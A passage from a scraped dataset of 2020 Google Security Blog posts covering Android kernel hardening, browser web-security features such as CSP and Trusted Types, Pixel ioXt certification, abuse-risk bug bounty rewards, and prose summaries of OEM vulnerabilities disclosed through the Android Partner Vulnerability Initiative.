since Android 10.   KernelAddressSANitizer (KASAN) is a dynamic memory error detector designed to find out-of-bound and use-after-free bugs in the Linux kernel. Its Software Tag-Based mode is a software implementation of the memory tagging concept for the kernel. Software Tag-Based KASAN is available in 4.14, 4.19 and 5.4 Android kernels, and can be enabled with the CONFIG_KASAN_SW_TAGS kernel configuration option. Currently Tag-Based KASAN only supports tagging of slab memory; support for other types of memory (such as stack and globals) will be added in the future.   Compared to Generic KASAN, Tag-Based KASAN has significantly lower memory requirements (see this kernel commit for details), which makes it usable on dog food testing devices. Another use case for Software Tag-Based KASAN is checking the existing kernel code for compatibility with memory tagging. As Tag-Based KASAN is based on similar concepts as the future in-kernel MTE support, making sure that kernel code works with Tag-Based KASAN will ease in-kernel MTE integration in the future.  Expanding existing compiler mitigations  We’ve continued to expand the compiler mitigations that have been rolled out in prior releases as well. This includes adding both integer and bounds sanitizers to some core libraries that were lacking them. For example, the libminikin fonts library and the libui rendering library are now bounds sanitized. We’ve hardened the NFC stack by implementing both integer overflow sanitizer and bounds sanitizer in those components.   In addition to the hard mitigations like sanitizers, we also continue to expand our use of CFI as an exploit mitigation. CFI has been enabled in Android’s networking daemon, DNS resolver, and more of our core javascript libraries like libv8 and the PacProcessor.  The effectiveness of our software codec sandbox Prior to the Release of Android 10 we announced a new constrained sandbox for software codecs. We’re really pleased with the results. Thus far, Android 10 is the first Android release since the infamous stagefright vulnerabilities in Android 5.0  with zero critical-severity vulnerabilities in the media frameworks.   Thank you to Jeff Vander Stoep, Alexander Potapenko, Stephen Hines, Andrey Konovalov, Mitch Phillips, Ivan Lozano, Kostya Kortchinsky, Christopher Ferris, Cindy Zhou, Evgenii Stepanov, Kevin Deus, Peter Collingbourne, Elliott Hughes, Kees Cook and Ken Chen for their contributions to this post.      ", "date": "June 30, 2020"},
{"website": "Google-Security", "title": "\nTowards native security defenses for the web ecosystem\n", "author": ["Posted by Artur Janc and Lukas Weichselbaum, Information Security Engineers"], "link": "https://security.googleblog.com/2020/07/towards-native-security-defenses-for.html", "abstract": "                             Posted by Artur Janc and Lukas Weichselbaum, Information Security Engineers      With the recent launch of Chrome 83, and the upcoming release of Mozilla Firefox 79, web developers are gaining powerful new security mechanisms to protect their applications from common web vulnerabilities. In this post we share how our Information Security Engineering team is deploying  Trusted Types ,  Content Security Policy ,  Fetch Metadata Request Headers  and the  Cross-Origin Opener Policy  across Google to help guide and inspire other developers to similarly adopt these features to protect their applications.        History     Since the advent of modern web applications, such as email clients or document editors accessible in your browser, developers have been dealing with common web vulnerabilities which may allow user data to fall prey to attackers. While the web platform provides robust isolation for the underlying operating system, the isolation between web applications themselves is a different story. Issues such as  XSS ,  CSRF  and  cross-site leaks  have become unfortunate facets of web development, affecting almost every website at some point in time.    These vulnerabilities are unintended consequences of some of the web's most wonderful characteristics: composability, openness, and ease of development. Simply put, the original vision of the web as a  mesh of interconnected documents  did not anticipate the creation of a vibrant ecosystem of web applications handling private data for billions of people across the globe. Consequently, the security capabilities of the web platform meant to help developers safeguard their users' data have evolved slowly and provided only partial protections from common flaws.    Web developers have traditionally compensated for the platform's shortcomings by building additional security engineering tools and processes to protect their applications from common flaws; such infrastructure has often proven costly to develop and maintain. As the web continues to change to offer developers more impressive capabilities, and web applications become more critical to our lives, we find ourselves in increasing need of more powerful, all-encompassing security mechanisms built directly into the web platform.    Over the past two years, browser makers and security engineers from Google and other companies have collaborated on the design and implementation of several major security features to defend against common web flaws. These mechanisms, which we focus on in this post, protect against injections and offer isolation capabilities, addressing two major, long-standing sources of insecurity on the web.     Injection Vulnerabilities       In the design of systems, mixing code and data is one of the canonical security anti-patterns, causing software vulnerabilities  as far back as in the 1980s . It is the root cause of vulnerabilities such as  SQL injection  and  command injection , allowing the compromise of databases and application servers.    On the web, application code has historically been intertwined with page data. HTML markup such as  &lt;script&gt;  elements or event handler attributes ( onclick  or  onload ) allow  JavaScript  execution; even the familiar URL can carry code and result in script execution when navigating to a  javascript : link. While sometimes convenient, the upshot of this design is that &#8211; unless the application takes care to protect itself &#8211; data used to compose an HTML page can easily inject unwanted scripts and take control of the application in the user's browser.    Addressing this problem in a principled manner requires allowing the application to separate its data from code; this can be done by enabling two new security features: Trusted Types and Content Security Policy based on script nonces.            Trusted Types    Main article:  web.dev/trusted-types  by  Krzysztof Kotowicz      JavaScript functions used by developers to build web applications often rely on parsing arbitrary structure out of strings. A string which seems to contain data can be turned directly into code when passed to a common API, such as  innerHTML . This is the root cause of most  DOM-based XSS vulnerabilities .    Trusted Types make JavaScript code safe-by-default by restricting risky operations, such as generating HTML or creating scripts, to require a special object &#8211; a Trusted Type. The browser will ensure that any use of dangerous DOM functions is allowed only if the right object is provided to the function. As long as an application produces these objects safely in a central  Trusted Types policy , it will be free of DOM-based XSS bugs.    You can enable Trusted Types by setting the following response header:         We have recently launched Trusted Types for all users of  My Google Activity  and are working with dozens of product teams across Google as well as JavaScript framework owners to make their code support this important safety mechanism.    Trusted Types are supported in Chrome 83 and other Chromium-based browsers, and a  polyfill  is available for other user agents.     Content Security Policy based on script nonces    Main article:  Reshaping web defenses with strict Content Security Policy      Content Security Policy (CSP) allows developers to require every &lt;script&gt; on the page to contain a secret value unknown to attackers. The script  nonce  attribute, set to an unpredictable number for every page load, acts as a guarantee that a given script is under the control of the application: even if part of the page is injected by an attacker, the browser will refuse to execute any injected script which doesn't identify itself with the correct nonce. This mitigates the impact of any server-side injection bugs, such as  reflected XSS  and  stored XSS .    CSP can be enabled by setting the following HTTP response header:         This header requires all scripts in your HTML templating system to include a nonce attribute with a value matching the one in the response header:         Our  CSP Evaluator tool  can help you configure a strong policy. To help deploy a production-quality CSP in your application, check out  this presentation  and the documentation on  csp.withgoogle.com .    Since the initial launch of CSP at Google, we have deployed strong policies on 75% of outgoing traffic from our applications, including in our flagship products such as GMail and Google Docs &amp; Drive. CSP has mitigated the exploitation of over 30 high-risk XSS flaws across Google in the past two years.    Nonce-based CSP is supported in Chrome, Firefox, Microsoft Edge and other Chromium-based browsers. Partial support for this variant of CSP is also available in Safari.     Isolation Capabilities       Many kinds of web flaws are exploited by an attacker's site forcing an unwanted interaction with another web application. Preventing these issues requires browsers to offer new mechanisms to allow applications to restrict such behaviors.  Fetch Metadata Request Headers  enable building server-side restrictions when processing incoming HTTP requests; the  Cross-Origin Opener Policy  is a client-side mechanism which protects the application's windows from unwanted DOM interactions.     Fetch Metadata Request Headers    Main article:  web.dev/fetch-metadata  by  Lukas Weichselbaum      A common cause of web security problems is that applications don't receive information about the source of a given HTTP request, and thus aren't able to distinguish benign self-initiated web traffic from unwanted requests sent by other websites. This leads to vulnerabilities such as cross-site request forgery ( CSRF ) and web-based information leaks ( XS-leaks ).    Fetch Metadata headers, which the browser attaches to outgoing HTTP requests, solve this problem by providing the application with trustworthy information about the provenance of requests sent to the server: the source of the request, its type (for example, whether it's a navigation or resource request), and other security-relevant metadata.    By checking the values of these new HTTP headers (Sec-Fetch-Site, Sec-Fetch-Mode and Sec-Fetch-Dest), applications can build flexible server-side logic to reject untrusted requests, similar to the following:         We provided a detailed explanation of this logic and adoption considerations at  web.dev/fetch-metadata . Importantly, Fetch Metadata can both complement and facilitate the adoption of  Cross-Origin Resource Policy  which offers client-side protection against unexpected subresource loads; this header is described in detail at  resourcepolicy.fyi .    At Google, we've enabled restrictions using Fetch Metadata headers in several major products such as Google Photos, and are following up with a large-scale rollout across our application ecosystem.    Fetch Metadata headers are currently sent by Chrome and Chromium-based browsers and are available in development versions of Firefox.     Cross-Origin Opener Policy    Main article:  web.dev/coop-coep  by  Eiji Kitamura      By default, the web permits some interactions with browser windows belonging to another application: any site can open a pop-up to your webmail client and send it messages via the  postMessage  API, navigate it to another URL, or  obtain information about its frames . All of these capabilities can lead to information leak vulnerabilities:         Cross-Origin Opener Policy (COOP) allows you to lock down your application to prevent such interactions. To enable COOP in your application, set the following HTTP response header:         If your application opens other sites as pop-ups, you may need to set the header value to same-origin-allow-popups instead; see  this document  for details.    We are currently testing Cross-Origin Opener Policy in several Google applications, and we're looking forward to enabling it broadly in the coming months.    COOP is available starting in Chrome 83 and in Firefox 79.     The Future       Creating a strong and vibrant web requires developers to be able to guarantee the safety of their users' data. Adding security mechanisms to the web platform &#8211; building them directly into browsers &#8211; is an important step forward for the ecosystem: browsers can help developers understand and control aspects of their sites which affect their security posture. As users update to recent versions of their favorite browsers, they will gain protections from many of the security flaws that have affected web applications in the past.    While the security features described in this post are not a panacea, they offer fundamental building blocks that help developers build secure web applications. We're excited about the continued deployment of these mechanisms across Google, and we're looking forward to collaborating with browser makers and the web standards community to improve them in the future.     For more information about web security mechanisms and the bugs they prevent, see the  Securing Web Apps with Modern Platform Features  Google I/O talk ( video ).                                    Posted by Artur Janc and Lukas Weichselbaum, Information Security Engineers  With the recent launch of Chrome 83, and the upcoming release of Mozilla Firefox 79, web developers are gaining powerful new security mechanisms to protect their applications from common web vulnerabilities. In this post we share how our Information Security Engineering team is deploying Trusted Types, Content Security Policy, Fetch Metadata Request Headers and the Cross-Origin Opener Policy across Google to help guide and inspire other developers to similarly adopt these features to protect their applications.  History  Since the advent of modern web applications, such as email clients or document editors accessible in your browser, developers have been dealing with common web vulnerabilities which may allow user data to fall prey to attackers. While the web platform provides robust isolation for the underlying operating system, the isolation between web applications themselves is a different story. Issues such as XSS, CSRF and cross-site leaks have become unfortunate facets of web development, affecting almost every website at some point in time.  These vulnerabilities are unintended consequences of some of the web's most wonderful characteristics: composability, openness, and ease of development. Simply put, the original vision of the web as a mesh of interconnected documents did not anticipate the creation of a vibrant ecosystem of web applications handling private data for billions of people across the globe. Consequently, the security capabilities of the web platform meant to help developers safeguard their users' data have evolved slowly and provided only partial protections from common flaws.  Web developers have traditionally compensated for the platform's shortcomings by building additional security engineering tools and processes to protect their applications from common flaws; such infrastructure has often proven costly to develop and maintain. As the web continues to change to offer developers more impressive capabilities, and web applications become more critical to our lives, we find ourselves in increasing need of more powerful, all-encompassing security mechanisms built directly into the web platform.  Over the past two years, browser makers and security engineers from Google and other companies have collaborated on the design and implementation of several major security features to defend against common web flaws. These mechanisms, which we focus on in this post, protect against injections and offer isolation capabilities, addressing two major, long-standing sources of insecurity on the web.  Injection Vulnerabilities  In the design of systems, mixing code and data is one of the canonical security anti-patterns, causing software vulnerabilities as far back as in the 1980s. It is the root cause of vulnerabilities such as SQL injection and command injection, allowing the compromise of databases and application servers.  On the web, application code has historically been intertwined with page data. HTML markup such as   elements or event handler attributes (onclick or onload) allow JavaScript execution; even the familiar URL can carry code and result in script execution when navigating to a javascript: link. While sometimes convenient, the upshot of this design is that – unless the application takes care to protect itself – data used to compose an HTML page can easily inject unwanted scripts and take control of the application in the user's browser.  Addressing this problem in a principled manner requires allowing the application to separate its data from code; this can be done by enabling two new security features: Trusted Types and Content Security Policy based on script nonces.    Trusted Types Main article: web.dev/trusted-types by Krzysztof Kotowicz  JavaScript functions used by developers to build web applications often rely on parsing arbitrary structure out of strings. A string which seems to contain data can be turned directly into code when passed to a common API, such as innerHTML. This is the root cause of most DOM-based XSS vulnerabilities.  Trusted Types make JavaScript code safe-by-default by restricting risky operations, such as generating HTML or creating scripts, to require a special object – a Trusted Type. The browser will ensure that any use of dangerous DOM functions is allowed only if the right object is provided to the function. As long as an application produces these objects safely in a central Trusted Types policy, it will be free of DOM-based XSS bugs.  You can enable Trusted Types by setting the following response header:   We have recently launched Trusted Types for all users of My Google Activity and are working with dozens of product teams across Google as well as JavaScript framework owners to make their code support this important safety mechanism.  Trusted Types are supported in Chrome 83 and other Chromium-based browsers, and a polyfill is available for other user agents.  Content Security Policy based on script nonces Main article: Reshaping web defenses with strict Content Security Policy  Content Security Policy (CSP) allows developers to require every   on the page to contain a secret value unknown to attackers. The script nonce attribute, set to an unpredictable number for every page load, acts as a guarantee that a given script is under the control of the application: even if part of the page is injected by an attacker, the browser will refuse to execute any injected script which doesn't identify itself with the correct nonce. This mitigates the impact of any server-side injection bugs, such as reflected XSS and stored XSS.  CSP can be enabled by setting the following HTTP response header:   This header requires all scripts in your HTML templating system to include a nonce attribute with a value matching the one in the response header:   Our CSP Evaluator tool can help you configure a strong policy. To help deploy a production-quality CSP in your application, check out this presentation and the documentation on csp.withgoogle.com.  Since the initial launch of CSP at Google, we have deployed strong policies on 75% of outgoing traffic from our applications, including in our flagship products such as GMail and Google Docs & Drive. CSP has mitigated the exploitation of over 30 high-risk XSS flaws across Google in the past two years.  Nonce-based CSP is supported in Chrome, Firefox, Microsoft Edge and other Chromium-based browsers. Partial support for this variant of CSP is also available in Safari.  Isolation Capabilities  Many kinds of web flaws are exploited by an attacker's site forcing an unwanted interaction with another web application. Preventing these issues requires browsers to offer new mechanisms to allow applications to restrict such behaviors. Fetch Metadata Request Headers enable building server-side restrictions when processing incoming HTTP requests; the Cross-Origin Opener Policy is a client-side mechanism which protects the application's windows from unwanted DOM interactions.  Fetch Metadata Request Headers Main article: web.dev/fetch-metadata by Lukas Weichselbaum  A common cause of web security problems is that applications don't receive information about the source of a given HTTP request, and thus aren't able to distinguish benign self-initiated web traffic from unwanted requests sent by other websites. This leads to vulnerabilities such as cross-site request forgery (CSRF) and web-based information leaks (XS-leaks).  Fetch Metadata headers, which the browser attaches to outgoing HTTP requests, solve this problem by providing the application with trustworthy information about the provenance of requests sent to the server: the source of the request, its type (for example, whether it's a navigation or resource request), and other security-relevant metadata.  By checking the values of these new HTTP headers (Sec-Fetch-Site, Sec-Fetch-Mode and Sec-Fetch-Dest), applications can build flexible server-side logic to reject untrusted requests, similar to the following:   We provided a detailed explanation of this logic and adoption considerations at web.dev/fetch-metadata. Importantly, Fetch Metadata can both complement and facilitate the adoption of Cross-Origin Resource Policy which offers client-side protection against unexpected subresource loads; this header is described in detail at resourcepolicy.fyi.  At Google, we've enabled restrictions using Fetch Metadata headers in several major products such as Google Photos, and are following up with a large-scale rollout across our application ecosystem.  Fetch Metadata headers are currently sent by Chrome and Chromium-based browsers and are available in development versions of Firefox.  Cross-Origin Opener Policy Main article: web.dev/coop-coep by Eiji Kitamura  By default, the web permits some interactions with browser windows belonging to another application: any site can open a pop-up to your webmail client and send it messages via the postMessage API, navigate it to another URL, or obtain information about its frames. All of these capabilities can lead to information leak vulnerabilities:   Cross-Origin Opener Policy (COOP) allows you to lock down your application to prevent such interactions. To enable COOP in your application, set the following HTTP response header:   If your application opens other sites as pop-ups, you may need to set the header value to same-origin-allow-popups instead; see this document for details.  We are currently testing Cross-Origin Opener Policy in several Google applications, and we're looking forward to enabling it broadly in the coming months.  COOP is available starting in Chrome 83 and in Firefox 79.  The Future  Creating a strong and vibrant web requires developers to be able to guarantee the safety of their users' data. Adding security mechanisms to the web platform – building them directly into browsers – is an important step forward for the ecosystem: browsers can help developers understand and control aspects of their sites which affect their security posture. As users update to recent versions of their favorite browsers, they will gain protections from many of the security flaws that have affected web applications in the past.  While the security features described in this post are not a panacea, they offer fundamental building blocks that help developers build secure web applications. We're excited about the continued deployment of these mechanisms across Google, and we're looking forward to collaborating with browser makers and the web standards community to improve them in the future.  For more information about web security mechanisms and the bugs they prevent, see the Securing Web Apps with Modern Platform Features Google I/O talk (video).     ", "date": "July 22, 2020"},
{"website": "Google-Security", "title": "\nPixel 4a is the first device to go through ioXt at launch\n", "author": ["Posted by Eugene Liderman and Xevi Miro Bruix, Android Security and Privacy Team"], "link": "https://security.googleblog.com/2020/08/pixel-4a-is-first-device-to-go-through.html", "abstract": "                             Posted by Eugene Liderman and Xevi Miro Bruix, Android Security and Privacy Team               Trust is very important when it comes to the relationship between a user and their smartphone. While phone functionality and design can enhance the user experience, security is fundamental and foundational to our relationship with our phones.There are multiple ways to build trust around the security capabilities that a device provides and we continue to invest in verifiable ways to do just that.      Pixel 4a ioXt certification      Today we are happy to announce that the  Pixel 4/4 XL  and the  newly launched Pixel 4a  are the first Android smartphones to go through  ioXt certification  against the  Android Profile.       The  Internet of Secure Things Alliance (ioXt)  manages a security compliance assessment program for connected devices. ioXt has over 200 members across various industries, including Google, Amazon, Facebook, T-Mobile, Comcast, Zigbee Alliance, Z-Wave Alliance, Legrand, Resideo, Schneider Electric, and many others. With so many companies involved, ioXt covers a wide range of device types, including smart lighting, smart speakers, webcams, and Android smartphones.     The core focus of ioXt is &#8220;to set security standards that bring  security, upgradability  and  transparency  to the market and directly into the hands of consumers.&#8221; This is accomplished by assessing devices against a  baseline set of requirements  and relying on publicly available evidence. The goal of ioXt&#8217;s approach is to enable users, enterprises, regulators, and other stakeholders to understand the security in connected products to drive better awareness towards how these products are protecting the security and privacy of users.     ioXt&#8217;s baseline security requirements are tailored for product classes, and the  ioXt Android Profile  enables smartphone manufacturers to differentiate security capabilities, including biometric authentication strength, security update frequency, length of security support lifetime commitment, vulnerability disclosure program quality, and preloaded app risk minimization.     We believe that using a widely known industry consortium standard for Pixel certification provides increased trust in the security claims we make to our users.  NCC Group  has published an audit report that can be downloaded  here . The report documents the evaluation of  Pixel 4 / 4 XL  and  Pixel 4a  against the ioXt Android Profile.       Security by Default  is one of the most important criteria used in the ioXt Android profile. Security by Default rates devices by cumulatively scoring the risk for all preloads on a particular device. For this particular measurement, we worked with a team of university experts from the University of Cambridge, University of Strathclyde, and Johannes Kepler University in Linz to create a formula that considers the risk of platform signed apps, pregranted permissions on preloaded apps, and apps communicating using cleartext traffic.        Screenshot of the  presentation  of the  Android Device Security Database  at the  Android Security Symposium 2020     In partnership with those teams, Google created  Uraniborg , an open source tool that collects necessary attributes from the device and runs it through this formula to come up with a raw score. NCC Group leveraged Uraniborg to conduct the assessment for the ioXt Security by Default category.     As part of our ongoing certification efforts, we look forward to submitting future Pixel smartphones through the ioXt standard, and we encourage the Android device ecosystem to participate in similar transparency efforts for their devices.        Acknowledgements: This post leveraged contributions from Sudhi Herle, Billy Lau and Sam Schumacher                                        Posted by Eugene Liderman and Xevi Miro Bruix, Android Security and Privacy Team   Trust is very important when it comes to the relationship between a user and their smartphone. While phone functionality and design can enhance the user experience, security is fundamental and foundational to our relationship with our phones.There are multiple ways to build trust around the security capabilities that a device provides and we continue to invest in verifiable ways to do just that.   Pixel 4a ioXt certification   Today we are happy to announce that the Pixel 4/4 XL and the newly launched Pixel 4a are the first Android smartphones to go through ioXt certification against the Android Profile.    The Internet of Secure Things Alliance (ioXt) manages a security compliance assessment program for connected devices. ioXt has over 200 members across various industries, including Google, Amazon, Facebook, T-Mobile, Comcast, Zigbee Alliance, Z-Wave Alliance, Legrand, Resideo, Schneider Electric, and many others. With so many companies involved, ioXt covers a wide range of device types, including smart lighting, smart speakers, webcams, and Android smartphones.   The core focus of ioXt is “to set security standards that bring security, upgradability and transparency to the market and directly into the hands of consumers.” This is accomplished by assessing devices against a baseline set of requirements and relying on publicly available evidence. The goal of ioXt’s approach is to enable users, enterprises, regulators, and other stakeholders to understand the security in connected products to drive better awareness towards how these products are protecting the security and privacy of users.   ioXt’s baseline security requirements are tailored for product classes, and the ioXt Android Profile enables smartphone manufacturers to differentiate security capabilities, including biometric authentication strength, security update frequency, length of security support lifetime commitment, vulnerability disclosure program quality, and preloaded app risk minimization.   We believe that using a widely known industry consortium standard for Pixel certification provides increased trust in the security claims we make to our users. NCC Group has published an audit report that can be downloaded here. The report documents the evaluation of Pixel 4/4 XL and Pixel 4a against the ioXt Android Profile.    Security by Default is one of the most important criteria used in the ioXt Android profile. Security by Default rates devices by cumulatively scoring the risk for all preloads on a particular device. For this particular measurement, we worked with a team of university experts from the University of Cambridge, University of Strathclyde, and Johannes Kepler University in Linz to create a formula that considers the risk of platform signed apps, pregranted permissions on preloaded apps, and apps communicating using cleartext traffic. Screenshot of the presentation of the Android Device Security Database at the Android Security Symposium 2020  In partnership with those teams, Google created Uraniborg, an open source tool that collects necessary attributes from the device and runs it through this formula to come up with a raw score. NCC Group leveraged Uraniborg to conduct the assessment for the ioXt Security by Default category.   As part of our ongoing certification efforts, we look forward to submitting future Pixel smartphones through the ioXt standard, and we encourage the Android device ecosystem to participate in similar transparency efforts for their devices.    Acknowledgements: This post leveraged contributions from Sudhi Herle, Billy Lau and Sam Schumacher      ", "date": "August 10, 2020"},
{"website": "Google-Security", "title": "\nAnnouncing new reward amounts for abuse risk researchers\n", "author": ["Posted by Marc Henson, Lead and Program Manager, Trust & Safety; Anna Hupa, Senior Strategist, at Google"], "link": "https://security.googleblog.com/2020/09/announcing-new-reward-amounts-for-abuse.html", "abstract": "                             Posted by Marc Henson, Lead and Program Manager, Trust &amp; Safety; Anna Hupa, Senior Strategist, at Google  It has been two years since we  officially expanded  the scope of Google&#8217;s Vulnerability Reward Program (VRP) to include the identification of  product abuse risks .        Thanks to your work, we have identified more than 750 previously unknown product abuse risks, preventing abuse in Google products and protecting our users. Collaboration to address abuse is important, and we are committed to supporting research on this growing challenge. To take it one step further, and as of today, we are announcing increased reward amounts for reports focusing on potential attacks in the product abuse space.        The nature of product abuse is constantly changing. Why? The technology (product and protection) is changing, the actors are changing, and the field is growing. Within this dynamic environment, we are particularly interested in research that protects users' privacy, ensures the integrity of our technologies, as well as prevents financial fraud or other harms at scale.        Research in the product abuse space helps us deliver trusted and safe experiences to our users.  Martin Vigo's research  on Google Meet's dial-in feature is one great example of an 31337 report that allowed us to better protect users against bad actors. His research provided insight on how an attacker could attempt to find Meet Phone Numbers/Pin, which enabled us to launch further protections to ensure that Meet would provide a secure technology connecting us while we're apart.         New Reward Amounts for Abuse Risks               What&#8217;s new?  Based on the great submissions that we received in the past as well as feedback from our Bug Hunters, we increased the highest reward by 166% from $5,000 to $13,337. Research with medium to high impact and probability will now be eligible for payment up to $5,000.         What did not change?  Identification of new product abuse risks remains the primary goal of the program. Reports that qualify for a reward are those that will result in changes to the product code, as opposed to removal of individual pieces of abusive content. The final reward amount for a given abuse risk report also remains&nbsp; at the discretion of the reward panel. When evaluating the impact of an abuse risk, the panels look at both the severity of the issue as well as the number of impacted users.         What's next?  We plan to expand the scope of  Vulnerability Research Grants  to support research preventing abuse risks. Stay tuned for more information!        Starting today the new rewards take effect. Any reports that were submitted before September 1, 2020 will be rewarded based on the previous rewards table.        We look forward to working closely together with the researcher community to prevent abuse of Google products and ensure user safety.        Happy bug hunting!                                    Posted by Marc Henson, Lead and Program Manager, Trust & Safety; Anna Hupa, Senior Strategist, at GoogleIt has been two years since we officially expanded the scope of Google’s Vulnerability Reward Program (VRP) to include the identification of product abuse risks.Thanks to your work, we have identified more than 750 previously unknown product abuse risks, preventing abuse in Google products and protecting our users. Collaboration to address abuse is important, and we are committed to supporting research on this growing challenge. To take it one step further, and as of today, we are announcing increased reward amounts for reports focusing on potential attacks in the product abuse space.The nature of product abuse is constantly changing. Why? The technology (product and protection) is changing, the actors are changing, and the field is growing. Within this dynamic environment, we are particularly interested in research that protects users' privacy, ensures the integrity of our technologies, as well as prevents financial fraud or other harms at scale.Research in the product abuse space helps us deliver trusted and safe experiences to our users. Martin Vigo's research on Google Meet's dial-in feature is one great example of an 31337 report that allowed us to better protect users against bad actors. His research provided insight on how an attacker could attempt to find Meet Phone Numbers/Pin, which enabled us to launch further protections to ensure that Meet would provide a secure technology connecting us while we're apart.New Reward Amounts for Abuse RisksWhat’s new? Based on the great submissions that we received in the past as well as feedback from our Bug Hunters, we increased the highest reward by 166% from $5,000 to $13,337. Research with medium to high impact and probability will now be eligible for payment up to $5,000.What did not change? Identification of new product abuse risks remains the primary goal of the program. Reports that qualify for a reward are those that will result in changes to the product code, as opposed to removal of individual pieces of abusive content. The final reward amount for a given abuse risk report also remains  at the discretion of the reward panel. When evaluating the impact of an abuse risk, the panels look at both the severity of the issue as well as the number of impacted users.What's next? We plan to expand the scope of Vulnerability Research Grants to support research preventing abuse risks. Stay tuned for more information!Starting today the new rewards take effect. Any reports that were submitted before September 1, 2020 will be rewarded based on the previous rewards table.We look forward to working closely together with the researcher community to prevent abuse of Google products and ensure user safety.Happy bug hunting!     ", "date": "September 1, 2020"},
{"website": "Google-Security", "title": "\nAnnouncing the launch of the Android Partner Vulnerability Initiative\n", "author": [], "link": "https://security.googleblog.com/2020/10/announcing-launch-of-android-partner.html", "abstract": "                                Posted by Kylie McRoberts, Program Manager and Alec Guertin, Security Engineer                    Google&#8217;s Android Security & Privacy team has launched the  Android Partner Vulnerability Initiative  (APVI) to manage security issues specific to Android OEMs. The APVI is designed to drive remediation and provide transparency to users about issues we have discovered at Google that affect device models shipped by Android partners.     Another layer of security     Android incorporates industry-leading security features and every day we work with developers and device implementers to keep the Android platform and ecosystem safe. As part of that effort, we have a range of existing programs to enable security researchers to report security issues they have found. For example, you can report vulnerabilities in Android code via the  Android Security Rewards Program  (ASR), and vulnerabilities in popular third-party Android apps through the  Google Play Security Rewards Program . Google releases ASR reports in Android Open Source Project (AOSP) based code through the  Android Security Bulletins  (ASB). These reports are issues that could impact all Android based devices. All Android partners must adopt ASB changes in order to declare the current month&#8217;s Android security patch level (SPL). But until recently, we didn&#8217;t have a clear way to process Google-discovered security issues outside of AOSP code that are unique to a much smaller set of specific Android OEMs. The APVI aims to close this gap, adding another layer of security for this targeted set of Android OEMs.      Improving Android OEM device security      The APVI covers Google-discovered issues that could potentially affect the security posture of an Android device or its user and is aligned to  ISO/IEC 29147:2018  Information technology -- Security techniques -- Vulnerability disclosure recommendations. The initiative covers a wide range of issues impacting device code that is not serviced or maintained by Google (these are handled by the Android Security Bulletins).      Protecting Android users      The APVI has already processed a number of security issues, improving user protection against permissions bypasses, execution of code in the kernel, credential leaks and generation of unencrypted backups. Below are a few examples of what we&#8217;ve found, the impact and OEM remediation efforts.            Permission Bypass      In some versions of a third-party pre-installed over-the-air (OTA) update solution, a custom system service in the Android framework exposed privileged APIs directly to the OTA app. The service ran as the system user and did not require any permissions to access, instead checking for knowledge of a hardcoded password. The operations available varied across versions, but always allowed access to sensitive APIs, such as silently installing/uninstalling APKs, enabling/disabling apps and granting app permissions. This service appeared in the code base for many device builds across many OEMs, however it wasn&#8217;t always registered or exposed to apps. We&#8217;ve worked with impacted OEMs to make them aware of this security issue and provided guidance on how to remove or disable the affected code.              Credential Leak       A popular web browser pre-installed on many devices included a built-in password manager for sites visited by the user. The interface for this feature was exposed to WebView through JavaScript loaded in the context of each web page. A malicious site could have accessed the full contents of the user&#8217;s credential store. The credentials are encrypted at rest, but used a weak algorithm (DES) and a known, hardcoded key. This issue was reported to the developer and updates for the app were issued to users.                Overly-Privileged Apps       The   checkUidPermission   method in the   PackageManagerService   class was modified in the framework code for some devices to allow special permissions access to some apps. In one version, the method granted apps with the shared user ID  com.google.uid.shared  any permission they requested and apps signed with the same key as the  com.google.android.gsf  package any permission in their manifest. Another version of the modification allowed apps matching a list of package names and signatures to pass runtime permission checks even if the permission was not in their manifest. These issues have been fixed by the OEMs.    More information      Keep an eye out at  https://bugs.chromium.org/p/apvi/  for future disclosures of Google-discovered security issues under this program, or find more information there on issues that have already been disclosed.      Acknowledgements:   Scott Roberts, Shailesh Saini and Łukasz Siewierski, Android Security and Privacy Team                                        Posted by Kylie McRoberts, Program Manager and Alec Guertin, Security Engineer          Google’s Android Security & Privacy team has launched the Android Partner Vulnerability Initiative (APVI) to manage security issues specific to Android OEMs. The APVI is designed to drive remediation and provide transparency to users about issues we have discovered at Google that affect device models shipped by Android partners.   Another layer of security   Android incorporates industry-leading security features and every day we work with developers and device implementers to keep the Android platform and ecosystem safe. As part of that effort, we have a range of existing programs to enable security researchers to report security issues they have found. For example, you can report vulnerabilities in Android code via the Android Security Rewards Program (ASR), and vulnerabilities in popular third-party Android apps through the Google Play Security Rewards Program. Google releases ASR reports in Android Open Source Project (AOSP) based code through the Android Security Bulletins (ASB). These reports are issues that could impact all Android based devices. All Android partners must adopt ASB changes in order to declare the current month’s Android security patch level (SPL). But until recently, we didn’t have a clear way to process Google-discovered security issues outside of AOSP code that are unique to a much smaller set of specific Android OEMs. The APVI aims to close this gap, adding another layer of security for this targeted set of Android OEMs.    Improving Android OEM device security    The APVI covers Google-discovered issues that could potentially affect the security posture of an Android device or its user and is aligned to ISO/IEC 29147:2018 Information technology -- Security techniques -- Vulnerability disclosure recommendations. The initiative covers a wide range of issues impacting device code that is not serviced or maintained by Google (these are handled by the Android Security Bulletins).    Protecting Android users    The APVI has already processed a number of security issues, improving user protection against permissions bypasses, execution of code in the kernel, credential leaks and generation of unencrypted backups. Below are a few examples of what we’ve found, the impact and OEM remediation efforts.      Permission Bypass   In some versions of a third-party pre-installed over-the-air (OTA) update solution, a custom system service in the Android framework exposed privileged APIs directly to the OTA app. The service ran as the system user and did not require any permissions to access, instead checking for knowledge of a hardcoded password. The operations available varied across versions, but always allowed access to sensitive APIs, such as silently installing/uninstalling APKs, enabling/disabling apps and granting app permissions. This service appeared in the code base for many device builds across many OEMs, however it wasn’t always registered or exposed to apps. We’ve worked with impacted OEMs to make them aware of this security issue and provided guidance on how to remove or disable the affected code.        Credential Leak    A popular web browser pre-installed on many devices included a built-in password manager for sites visited by the user. The interface for this feature was exposed to WebView through JavaScript loaded in the context of each web page. A malicious site could have accessed the full contents of the user’s credential store. The credentials are encrypted at rest, but used a weak algorithm (DES) and a known, hardcoded key. This issue was reported to the developer and updates for the app were issued to users.          Overly-Privileged Apps    The checkUidPermission method in the PackageManagerService class was modified in the framework code for some devices to allow special permissions access to some apps. In one version, the method granted apps with the shared user ID com.google.uid.shared any permission they requested and apps signed with the same key as the com.google.android.gsf package any permission in their manifest. Another version of the modification allowed apps matching a list of package names and signatures to pass runtime permission checks even if the permission was not in their manifest. These issues have been fixed by the OEMs.   More information    Keep an eye out at https://bugs.chromium.org/p/apvi/ for future disclosures of Google-discovered security issues under this program, or find more information there on issues that have already been disclosed.   Acknowledgements: Scott Roberts, Shailesh Saini and Łukasz Siewierski, Android Security and Privacy Team      ", "date": "October 2, 2020"},
